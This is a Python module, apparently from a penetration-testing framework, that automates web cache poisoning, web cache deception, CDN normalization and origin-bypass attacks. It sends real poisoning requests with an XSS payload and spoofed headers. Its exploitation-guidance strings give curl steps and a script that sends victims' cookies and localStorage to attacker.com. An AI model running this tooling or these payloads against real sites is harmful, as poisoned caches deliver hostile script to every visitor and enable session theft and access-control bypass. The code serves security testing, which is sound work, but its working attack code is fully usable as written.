"""Cache Poisoning module for automated testing

This module implements:
- Cache poisoning via unkeyed headers
- Cache key identification
- Web cache deception testing
- CDN cache key normalization testing
- Origin server bypass testing
- Exploitation guidance for XSS amplification and credential theft
"""

import asyncio
import hashlib
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine


class CachePoisoningType(Enum):
    """Types of cache poisoning vulnerabilities"""
    
    UNKEYED_HEADER = "unkeyed_header"  # Poisoning via unkeyed headers
    WEB_CACHE_DECEPTION = "web_cache_deception"  # Path confusion attacks
    CACHE_KEY_NORMALIZATION = "cache_key_normalization"  # CDN normalization issues
    ORIGIN_BYPASS = "origin_bypass"  # Bypass origin server protections


class CacheStatus(Enum):
    """Cache status indicators"""
    
    HIT = "hit"  # Response served from cache
    MISS = "miss"  # Response not in cache
    UNKNOWN = "unknown"  # Cannot determine cache status


@dataclass
class CacheTestPoint:
    """Represents a cache testing point"""
    
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    parameters: Dict[str, str] = field(default_factory=dict)


@dataclass
class CachePoisoningResult:
    """Result of cache poisoning testing"""
    
    test_point: CacheTestPoint
    is_vulnerable: bool
    poisoning_type: Optional[CachePoisoningType] = None
    unkeyed_header: Optional[str] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    cache_keys: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)
    exploitation_guidance: Optional[str] = None
    metadata: Dict = field(default_factory=dict)


@dataclass
class CacheKeyAnalysis:
    """Analysis of cache key components"""
    
    url: str
    keyed_components: List[str] = field(default_factory=list)
    unkeyed_headers: List[str] = field(default_factory=list)
    cache_status: CacheStatus = CacheStatus.UNKNOWN
    cache_control_headers: Dict[str, str] = field(default_factory=dict)
    cdn_detected: Optional[str] = None


class CachePoisoningTester:
    """Cache poisoning and web cache deception testing"""
    
    # Common unkeyed headers to test
    UNKEYED_HEADERS = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Forwarded-Proto",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Host",
        "X-Forwarded-Server",
        "X-HTTP-Host-Override",
        "Forwarded",
        "True-Client-IP",
        "X-Real-IP",
        "X-Forwarded-For",
        "CF-Connecting-IP",
        "X-Custom-IP-Authorization",
    ]
    
    # Cache status header indicators
    CACHE_HEADERS = [
        "X-Cache",
        "X-Cache-Status",
        "CF-Cache-Status",
        "X-Varnish",
        "Age",
        "X-Cache-Hits",
        "X-Served-By",
        "X-Cache-Lookup",
    ]
    
    # CDN detection patterns
    CDN_PATTERNS = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid"],
        "Fastly": ["x-served-by", "fastly"],
        "Akamai": ["akamai", "x-akamai"],
        "CloudFront": ["x-amz-cf-id", "cloudfront"],
        "Varnish": ["x-varnish", "via.*varnish"],
        "Nginx": ["x-nginx-cache"],
    }

    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize cache poisoning tester
        
        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()

    async def analyze_cache_keys(
        self, test_point: CacheTestPoint
    ) -> CacheKeyAnalysis:
        """Identify cache keys and unkeyed headers
        
        Args:
            test_point: The endpoint to analyze
        
        Returns:
            CacheKeyAnalysis with identified components
        """
        keyed_components = []
        unkeyed_headers = []
        
        # Send baseline request
        baseline_response = await self._send_request(test_point)
        baseline_hash = self._hash_response(baseline_response)
        
        # Detect cache status
        cache_status = self._detect_cache_status(baseline_response)
        
        # Extract cache control headers
        cache_control = self._extract_cache_headers(baseline_response)
        
        # Detect CDN
        cdn = self._detect_cdn(baseline_response)
        
        # Test URL components (path, query)
        # Test if changing path affects cache
        modified_test_point = CacheTestPoint(
            url=test_point.url + "/test",
            method=test_point.method,
            headers=test_point.headers.copy(),
            parameters=test_point.parameters.copy(),
        )
        modified_response = await self._send_request(modified_test_point)
        modified_hash = self._hash_response(modified_response)
        
        if modified_hash != baseline_hash:
            keyed_components.append("path")
        
        # Test if changing query parameters affects cache
        if test_point.parameters:
            modified_params = test_point.parameters.copy()
            modified_params["cache_test"] = "123"
            modified_test_point = CacheTestPoint(
                url=test_point.url,
                method=test_point.method,
                headers=test_point.headers.copy(),
                parameters=modified_params,
            )
            modified_response = await self._send_request(modified_test_point)
            modified_hash = self._hash_response(modified_response)
            
            if modified_hash != baseline_hash:
                keyed_components.append("query_parameters")
        
        # Test each header to see if it's keyed
        for header_name in self.UNKEYED_HEADERS:
            # Add unique value to header
            unique_value = f"cache-test-{hashlib.md5(header_name.encode()).hexdigest()[:8]}"
            modified_headers = test_point.headers.copy()
            modified_headers[header_name] = unique_value
            
            modified_test_point = CacheTestPoint(
                url=test_point.url,
                method=test_point.method,
                headers=modified_headers,
                parameters=test_point.parameters.copy(),
            )
            
            # Send request with modified header
            modified_response = await self._send_request(modified_test_point)
            
            # Check if response changed
            if self._response_contains_value(modified_response, unique_value):
                # Header is reflected in response
                # Now check if it's keyed by sending another request without the header
                second_response = await self._send_request(test_point)
                
                if self._response_contains_value(second_response, unique_value):
                    # Value persisted - header is unkeyed and cache was poisoned!
                    unkeyed_headers.append(header_name)
                else:
                    # Value didn't persist - header might be keyed
                    keyed_components.append(f"header:{header_name}")
            
            # Small delay to avoid overwhelming the cache
            await asyncio.sleep(0.1)
        
        return CacheKeyAnalysis(
            url=test_point.url,
            keyed_components=keyed_components,
            unkeyed_headers=unkeyed_headers,
            cache_status=cache_status,
            cache_control_headers=cache_control,
            cdn_detected=cdn,
        )

    async def test_unkeyed_header_poisoning(
        self, test_point: CacheTestPoint, cache_analysis: Optional[CacheKeyAnalysis] = None
    ) -> List[CachePoisoningResult]:
        """Test for cache poisoning via unkeyed headers
        
        Args:
            test_point: The endpoint to test
            cache_analysis: Optional pre-computed cache analysis
        
        Returns:
            List of cache poisoning results
        """
        results = []
        
        # Perform cache analysis if not provided
        if cache_analysis is None:
            cache_analysis = await self.analyze_cache_keys(test_point)
        
        # Test each unkeyed header
        for header_name in cache_analysis.unkeyed_headers:
            # Test with XSS payload
            xss_payload = f"<script>alert('Cache-Poisoned-{header_name}')</script>"
            
            # Poison the cache
            poison_headers = test_point.headers.copy()
            poison_headers[header_name] = xss_payload
            
            poison_test_point = CacheTestPoint(
                url=test_point.url,
                method=test_point.method,
                headers=poison_headers,
                parameters=test_point.parameters.copy(),
            )
            
            # Send poisoning request
            poison_response = await self._send_request(poison_test_point)
            
            # Wait for cache to update
            await asyncio.sleep(1)
            
            # Verify poisoning by sending clean request
            verify_response = await self._send_request(test_point)
            
            # Check if payload is in response
            if self._response_contains_value(verify_response, xss_payload):
                # Cache poisoning successful!
                result = CachePoisoningResult(
                    test_point=test_point,
                    is_vulnerable=True,
                    poisoning_type=CachePoisoningType.UNKEYED_HEADER,
                    unkeyed_header=header_name,
                    payload=xss_payload,
                    confidence=0.95,
                    cache_keys=cache_analysis.keyed_components,
                    evidence=[
                        f"Cache poisoning via unkeyed header: {header_name}",
                        f"Payload: {xss_payload}",
                        f"Payload persisted in cache",
                        f"Subsequent requests serve poisoned response",
                    ],
                    exploitation_guidance=self._generate_xss_amplification_guidance(
                        header_name, xss_payload
                    ),
                    metadata={
                        "cdn": cache_analysis.cdn_detected,
                        "cache_status": cache_analysis.cache_status.value,
                    },
                )
                results.append(result)
        
        return results

    async def test_web_cache_deception(
        self, test_point: CacheTestPoint
    ) -> List[CachePoisoningResult]:
        """Test for web cache deception attacks
        
        Args:
            test_point: The endpoint to test
        
        Returns:
            List of cache poisoning results
        """
        results = []
        
        # Web cache deception techniques
        deception_paths = [
            # Path confusion
            "/account/settings/style.css",
            "/account/settings/script.js",
            "/account/settings/image.png",
            "/account/settings/logo.jpg",
            # Path parameter
            "/account/settings;.css",
            "/account/settings;.js",
            # Encoded paths
            "/account/settings%2fstyle.css",
            "/account/settings%2f..%2fstyle.css",
            # Double encoding
            "/account/settings%252fstyle.css",
            # Null byte
            "/account/settings%00.css",
            # Newline
            "/account/settings%0a.css",
            # Question mark
            "/account/settings?.css",
            # Hash
            "/account/settings#.css",
        ]
        
        parsed_url = urlparse(test_point.url)
        base_path = parsed_url.path
        
        for deception_suffix in deception_paths:
            # Construct deception URL
            if base_path.endswith('/'):
                deception_url = test_point.url.rstrip('/') + deception_suffix
            else:
                deception_url = test_point.url + deception_suffix
            
            deception_test_point = CacheTestPoint(
                url=deception_url,
                method=test_point.method,
                headers=test_point.headers.copy(),
                parameters=test_point.parameters.copy(),
            )
            
            # Send request with deception path
            response = await self._send_request(deception_test_point)
            
            # Check if response contains sensitive data and is cacheable
            is_sensitive = self._contains_sensitive_data(response)
            is_cacheable = self._is_cacheable(response)
            
            if is_sensitive and is_cacheable:
                # Web cache deception vulnerability!
                result = CachePoisoningResult(
                    test_point=test_point,
                    is_vulnerable=True,
                    poisoning_type=CachePoisoningType.WEB_CACHE_DECEPTION,
                    payload=deception_suffix,
                    confidence=0.90,
                    evidence=[
                        f"Web cache deception detected",
                        f"Deception path: {deception_suffix}",
                        f"Sensitive data exposed: {self._extract_sensitive_indicators(response)}",
                        f"Response is cacheable",
                        f"Cache-Control: {response.headers.get('Cache-Control', 'not set')}",
                    ],
                    exploitation_guidance=self._generate_cache_deception_guidance(
                        deception_url
                    ),
                    metadata={
                        "deception_url": deception_url,
                        "sensitive_data_found": True,
                    },
                )
                results.append(result)
            
            # Small delay
            await asyncio.sleep(0.1)
        
        return results

    async def test_cdn_normalization(
        self, test_point: CacheTestPoint, cache_analysis: Optional[CacheKeyAnalysis] = None
    ) -> List[CachePoisoningResult]:
        """Test for CDN cache key normalization issues
        
        Args:
            test_point: The endpoint to test
            cache_analysis: Optional pre-computed cache analysis
        
        Returns:
            List of cache poisoning results
        """
        results = []
        
        # Perform cache analysis if not provided
        if cache_analysis is None:
            cache_analysis = await self.analyze_cache_keys(test_point)
        
        # Test various normalization bypasses
        normalization_tests = [
            # Port normalization
            ("port_80", {"Host": f"{urlparse(test_point.url).netloc}:80"}),
            ("port_443", {"Host": f"{urlparse(test_point.url).netloc}:443"}),
            # Case normalization
            ("uppercase_host", {"Host": urlparse(test_point.url).netloc.upper()}),
            ("mixed_case_host", {"Host": self._mixed_case(urlparse(test_point.url).netloc)}),
            # Scheme normalization
            ("http_scheme", {"X-Forwarded-Proto": "http"}),
            ("https_scheme", {"X-Forwarded-Proto": "https"}),
            # Path normalization
            ("double_slash", None),  # Will modify URL
            ("dot_segments", None),  # Will modify URL
        ]
        
        for test_name, header_modification in normalization_tests:
            if header_modification:
                # Test with modified headers
                modified_headers = test_point.headers.copy()
                modified_headers.update(header_modification)
                
                modified_test_point = CacheTestPoint(
                    url=test_point.url,
                    method=test_point.method,
                    headers=modified_headers,
                    parameters=test_point.parameters.copy(),
                )
            else:
                # Test with modified URL
                if test_name == "double_slash":
                    modified_url = test_point.url.replace("://", "://").replace("/", "//", 1)
                elif test_name == "dot_segments":
                    parsed = urlparse(test_point.url)
                    modified_path = parsed.path + "/../" + parsed.path.split("/")[-1]
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{modified_path}"
                else:
                    continue
                
                modified_test_point = CacheTestPoint(
                    url=modified_url,
                    method=test_point.method,
                    headers=test_point.headers.copy(),
                    parameters=test_point.parameters.copy(),
                )
            
            # Send request
            response = await self._send_request(modified_test_point)
            baseline_response = await self._send_request(test_point)
            
            # Check if responses differ (indicating normalization issue)
            if self._hash_response(response) != self._hash_response(baseline_response):
                result = CachePoisoningResult(
                    test_point=test_point,
                    is_vulnerable=True,
                    poisoning_type=CachePoisoningType.CACHE_KEY_NORMALIZATION,
                    payload=test_name,
                    confidence=0.75,
                    evidence=[
                        f"CDN normalization issue detected: {test_name}",
                        f"Different responses for normalized vs non-normalized requests",
                        f"CDN: {cache_analysis.cdn_detected or 'Unknown'}",
                    ],
                    exploitation_guidance=self._generate_normalization_guidance(test_name),
                    metadata={
                        "cdn": cache_analysis.cdn_detected,
                        "normalization_type": test_name,
                    },
                )
                results.append(result)
            
            await asyncio.sleep(0.1)
        
        return results

    async def test_origin_bypass(
        self, test_point: CacheTestPoint
    ) -> List[CachePoisoningResult]:
        """Test for origin server bypass via cache
        
        Args:
            test_point: The endpoint to test
        
        Returns:
            List of cache poisoning results
        """
        results = []
        
        # Test various origin bypass techniques
        bypass_headers = [
            # Override headers
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Override-URL", "/admin"),
            # Host override
            ("X-Forwarded-Host", "internal.local"),
            ("X-Host", "internal.local"),
            # Method override
            ("X-HTTP-Method-Override", "POST"),
            ("X-Method-Override", "POST"),
            # IP spoofing
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
        ]
        
        for header_name, header_value in bypass_headers:
            # Add bypass header
            bypass_headers_dict = test_point.headers.copy()
            bypass_headers_dict[header_name] = header_value
            
            bypass_test_point = CacheTestPoint(
                url=test_point.url,
                method=test_point.method,
                headers=bypass_headers_dict,
                parameters=test_point.parameters.copy(),
            )
            
            # Send request with bypass header
            response = await self._send_request(bypass_test_point)
            
            # Check if bypass was successful
            bypass_indicators = [
                "admin",
                "administrator",
                "dashboard",
                "internal",
                "forbidden",
                "unauthorized",
                "access denied",
            ]
            
            response_text_lower = response.text.lower()
            has_bypass_indicator = any(
                indicator in response_text_lower for indicator in bypass_indicators
            )
            
            # Check if response is different from baseline
            baseline_response = await self._send_request(test_point)
            is_different = self._hash_response(response) != self._hash_response(baseline_response)
            
            if has_bypass_indicator or (is_different and response.status_code in [200, 301, 302]):
                result = CachePoisoningResult(
                    test_point=test_point,
                    is_vulnerable=True,
                    poisoning_type=CachePoisoningType.ORIGIN_BYPASS,
                    unkeyed_header=header_name,
                    payload=header_value,
                    confidence=0.80,
                    evidence=[
                        f"Origin server bypass detected via {header_name}",
                        f"Header value: {header_value}",
                        f"Response status: {response.status_code}",
                        f"Bypass indicators found in response",
                    ],
                    exploitation_guidance=self._generate_origin_bypass_guidance(
                        header_name, header_value
                    ),
                    metadata={
                        "bypass_header": header_name,
                        "bypass_value": header_value,
                    },
                )
                results.append(result)
            
            await asyncio.sleep(0.1)
        
        return results

    # Helper methods
    
    async def _send_request(self, test_point: CacheTestPoint) -> Response:
        """Send HTTP request
        
        Args:
            test_point: The test point
        
        Returns:
            Response object
        """
        return await self.request_handler.send_request(
            method=test_point.method,
            url=test_point.url,
            headers=test_point.headers,
            data=test_point.parameters if test_point.method == "POST" else None,
        )
    
    def _hash_response(self, response: Response) -> str:
        """Generate hash of response for comparison
        
        Args:
            response: Response to hash
        
        Returns:
            Hash string
        """
        # Hash based on status code and body
        content = f"{response.status_code}:{response.text}"
        return hashlib.md5(content.encode()).hexdigest()
    
    def _response_contains_value(self, response: Response, value: str) -> bool:
        """Check if response contains a specific value
        
        Args:
            response: Response to check
            value: Value to search for
        
        Returns:
            True if value found, False otherwise
        """
        return value in response.text or value in str(response.headers)
    
    def _detect_cache_status(self, response: Response) -> CacheStatus:
        """Detect cache status from response headers
        
        Args:
            response: Response to analyze
        
        Returns:
            CacheStatus enum
        """
        for header_name in self.CACHE_HEADERS:
            header_value = response.headers.get(header_name, "").lower()
            
            if "hit" in header_value:
                return CacheStatus.HIT
            elif "miss" in header_value:
                return CacheStatus.MISS
        
        # Check Age header
        if "Age" in response.headers:
            age = int(response.headers.get("Age", "0"))
            if age > 0:
                return CacheStatus.HIT
        
        return CacheStatus.UNKNOWN
    
    def _extract_cache_headers(self, response: Response) -> Dict[str, str]:
        """Extract cache-related headers
        
        Args:
            response: Response to analyze
        
        Returns:
            Dictionary of cache headers
        """
        cache_headers = {}
        
        for header_name in ["Cache-Control", "Expires", "ETag", "Last-Modified", "Age", "Vary"]:
            if header_name in response.headers:
                cache_headers[header_name] = response.headers[header_name]
        
        return cache_headers
    
    def _detect_cdn(self, response: Response) -> Optional[str]:
        """Detect CDN from response headers
        
        Args:
            response: Response to analyze
        
        Returns:
            CDN name if detected, None otherwise
        """
        headers_str = str(response.headers).lower()
        
        for cdn_name, patterns in self.CDN_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, headers_str, re.IGNORECASE):
                    return cdn_name
        
        return None

    def _contains_sensitive_data(self, response: Response) -> bool:
        """Check if response contains sensitive data
        
        Args:
            response: Response to check
        
        Returns:
            True if sensitive data found, False otherwise
        """
        sensitive_patterns = [
            r"email[\"']?\s*[:=]\s*[\"']?[\w\.-]+@[\w\.-]+",
            r"password[\"']?\s*[:=]",
            r"api[_-]?key[\"']?\s*[:=]",
            r"secret[\"']?\s*[:=]",
            r"token[\"']?\s*[:=]",
            r"session[\"']?\s*[:=]",
            r"credit[_-]?card",
            r"ssn",
            r"social[_-]?security",
            r"account[_-]?number",
            r"balance[\"']?\s*[:=]\s*[\"']?\$?\d+",
        ]
        
        response_text = response.text.lower()
        
        for pattern in sensitive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def _is_cacheable(self, response: Response) -> bool:
        """Check if response is cacheable
        
        Args:
            response: Response to check
        
        Returns:
            True if cacheable, False otherwise
        """
        # Check Cache-Control header
        cache_control = response.headers.get("Cache-Control", "").lower()
        
        # Not cacheable if these directives present
        if any(directive in cache_control for directive in ["no-cache", "no-store", "private"]):
            return False
        
        # Cacheable if these directives present
        if any(directive in cache_control for directive in ["public", "max-age"]):
            return True
        
        # Check for Expires header
        if "Expires" in response.headers:
            return True
        
        # Default: assume cacheable for static resources
        if response.status_code == 200:
            return True
        
        return False
    
    def _extract_sensitive_indicators(self, response: Response) -> str:
        """Extract indicators of sensitive data
        
        Args:
            response: Response to analyze
        
        Returns:
            String describing sensitive data found
        """
        indicators = []
        
        if re.search(r"email", response.text, re.IGNORECASE):
            indicators.append("email addresses")
        if re.search(r"password", response.text, re.IGNORECASE):
            indicators.append("password fields")
        if re.search(r"token", response.text, re.IGNORECASE):
            indicators.append("tokens")
        if re.search(r"session", response.text, re.IGNORECASE):
            indicators.append("session data")
        if re.search(r"api[_-]?key", response.text, re.IGNORECASE):
            indicators.append("API keys")
        
        return ", ".join(indicators) if indicators else "sensitive data"
    
    def _mixed_case(self, text: str) -> str:
        """Convert text to mixed case
        
        Args:
            text: Text to convert
        
        Returns:
            Mixed case text
        """
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))

    # Exploitation guidance methods
    
    def _generate_xss_amplification_guidance(
        self, header_name: str, payload: str
    ) -> str:
        """Generate exploitation guidance for XSS amplification
        
        Args:
            header_name: The unkeyed header name
            payload: The XSS payload
        
        Returns:
            Exploitation guidance string
        """
        return f"""
## XSS Amplification via Cache Poisoning

### Vulnerability Summary
The cache accepts the `{header_name}` header as an unkeyed input, allowing an attacker to poison the cache with malicious content that will be served to all subsequent visitors.

### Exploitation Steps

1. **Poison the Cache**
   ```bash
   curl -H "{header_name}: {payload}" https://target.com/vulnerable-endpoint
   ```

2. **Verify Poisoning**
   ```bash
   curl https://target.com/vulnerable-endpoint
   # The response should contain the injected payload
   ```

3. **Impact**
   - All users visiting the cached page will execute the malicious JavaScript
   - Can be used for credential theft, session hijacking, or defacement
   - Persists until cache expires (check Cache-Control headers)

### Credential Theft Example
```javascript
// Payload to steal credentials
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
fetch('https://attacker.com/steal?localStorage=' + JSON.stringify(localStorage));
</script>
```

### Mitigation
- Include `{header_name}` in the cache key
- Validate and sanitize all header values before reflection
- Use `Vary: {header_name}` header to include it in cache key
- Implement proper output encoding
"""
    
    def _generate_cache_deception_guidance(self, deception_url: str) -> str:
        """Generate exploitation guidance for web cache deception
        
        Args:
            deception_url: The deception URL
        
        Returns:
            Exploitation guidance string
        """
        return f"""
## Web Cache Deception Attack

### Vulnerability Summary
The application serves sensitive content at paths that appear to be static resources, causing CDNs/caches to store private data.

### Exploitation Steps

1. **Identify Sensitive Endpoint**
   - Target: {deception_url}
   - This endpoint returns sensitive data but is cached as a static resource

2. **Poison Cache for Victim**
   ```bash
   # Send victim this link
   {deception_url}
   ```

3. **Retrieve Cached Sensitive Data**
   ```bash
   # After victim visits, attacker can retrieve cached data
   curl {deception_url}
   ```

### Attack Scenario
1. Attacker sends victim a link to: {deception_url}
2. Victim clicks link while authenticated
3. CDN caches the response (including victim's sensitive data)
4. Attacker requests same URL and receives victim's cached data

### Data at Risk
- Account information
- Personal details
- Session tokens
- API keys
- Private messages

### Mitigation
- Never cache responses containing sensitive data
- Use `Cache-Control: private, no-store` for authenticated content
- Validate file extensions server-side
- Implement proper path normalization
"""
    
    def _generate_normalization_guidance(self, normalization_type: str) -> str:
        """Generate exploitation guidance for normalization issues
        
        Args:
            normalization_type: Type of normalization issue
        
        Returns:
            Exploitation guidance string
        """
        return f"""
## CDN Cache Key Normalization Issue

### Vulnerability Summary
The CDN normalizes requests differently than the origin server, allowing cache poisoning through {normalization_type}.

### Exploitation Steps

1. **Identify Normalization Discrepancy**
   - CDN and origin server handle {normalization_type} differently
   - This creates cache key collisions

2. **Exploit the Discrepancy**
   - Send malicious request using {normalization_type} variation
   - CDN caches response under normalized key
   - Subsequent normal requests receive poisoned response

### Impact
- Cache poisoning
- Origin server bypass
- Access control bypass
- Content injection

### Mitigation
- Ensure consistent normalization between CDN and origin
- Implement strict cache key generation
- Use cache key debugging tools
- Monitor for anomalous cache behavior
"""
    
    def _generate_origin_bypass_guidance(
        self, header_name: str, header_value: str
    ) -> str:
        """Generate exploitation guidance for origin bypass
        
        Args:
            header_name: The bypass header name
            header_value: The bypass header value
        
        Returns:
            Exploitation guidance string
        """
        return f"""
## Origin Server Bypass via Cache

### Vulnerability Summary
The CDN/cache forwards the `{header_name}` header to the origin server, allowing bypass of origin-level protections.

### Exploitation Steps

1. **Bypass Origin Protections**
   ```bash
   curl -H "{header_name}: {header_value}" https://target.com/
   ```

2. **Access Restricted Resources**
   - Use header to access admin panels
   - Bypass IP restrictions
   - Override routing rules

### Common Bypass Headers
- X-Original-URL: Override request path
- X-Forwarded-Host: Override host header
- X-Forwarded-For: Spoof source IP
- X-Real-IP: Bypass IP restrictions

### Impact
- Access to administrative interfaces
- Bypass authentication/authorization
- Access to internal resources
- Privilege escalation

### Mitigation
- Do not trust forwarded headers from untrusted sources
- Validate all override headers
- Implement proper access controls at CDN level
- Use mutual TLS between CDN and origin
"""


# Convenience function for testing
async def test_cache_poisoning(
    target_url: str,
    request_handler: RequestHandler,
) -> Dict[str, List[CachePoisoningResult]]:
    """Test target for all cache poisoning vulnerabilities
    
    Args:
        target_url: Target URL to test
        request_handler: Request handler instance
    
    Returns:
        Dictionary of results by vulnerability type
    """
    tester = CachePoisoningTester(request_handler)
    
    test_point = CacheTestPoint(url=target_url)
    
    # Analyze cache keys
    cache_analysis = await tester.analyze_cache_keys(test_point)
    
    # Run all tests
    results = {
        "unkeyed_header": await tester.test_unkeyed_header_poisoning(test_point, cache_analysis),
        "web_cache_deception": await tester.test_web_cache_deception(test_point),
        "cdn_normalization": await tester.test_cdn_normalization(test_point, cache_analysis),
        "origin_bypass": await tester.test_origin_bypass(test_point),
    }
    
    return results
